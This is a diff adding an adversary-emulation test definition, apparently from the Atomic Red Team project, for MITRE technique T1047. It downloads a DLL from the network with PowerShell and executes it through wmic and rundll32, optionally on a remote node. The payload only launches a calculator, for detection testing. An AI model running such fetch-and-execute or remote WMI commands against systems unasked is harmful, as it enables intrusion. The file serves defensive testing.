@@ -1,0 +1,37 @@
+api_version: "2.0"
+name: WMI Execute rundll32
+description: |
+    This test uses wmic.exe to execute a DLL function using rundll32. Specify a valid value for remote IP using the node parameter.
+args:
+    - name: node
+      type: string
+      default: 127.0.0.1
+    - name: dll_to_execute
+      type: string
+      default: PathToAtomicsFolder\..\ExternalPayloads\calc.dll
+    - name: function_to_execute
+      type: string
+      default: StartW
+uuid: 00738d2a-4651-4d76-adf2-c43a41dfb243
+mitre:
+    tactics:
+        - 'TA0002: Execution'
+    techniques:
+        - 'T1047: Windows Management Instrumentation'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: DLL with function to execute must exist on disk at specified location (#{dll_to_execute})
+      inline: |
+        if (Test-Path "#{dll_to_execute}") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/bin/calc.dll?raw=true" -OutFile "#{dll_to_execute}"
+        }}
+      executor: powershell
+    - name: wmi-execute-rundll32
+      inline: |
+        wmic /node:{{.Args.node}} process call create "rundll32.exe \"{{.Args.dll_to_execute}}\" {{.Args.function_to_execute}}"
+      executor: command_prompt
+      cleanup:
+        inline: taskkill /f /im calculator.exe
+        executor: command_prompt
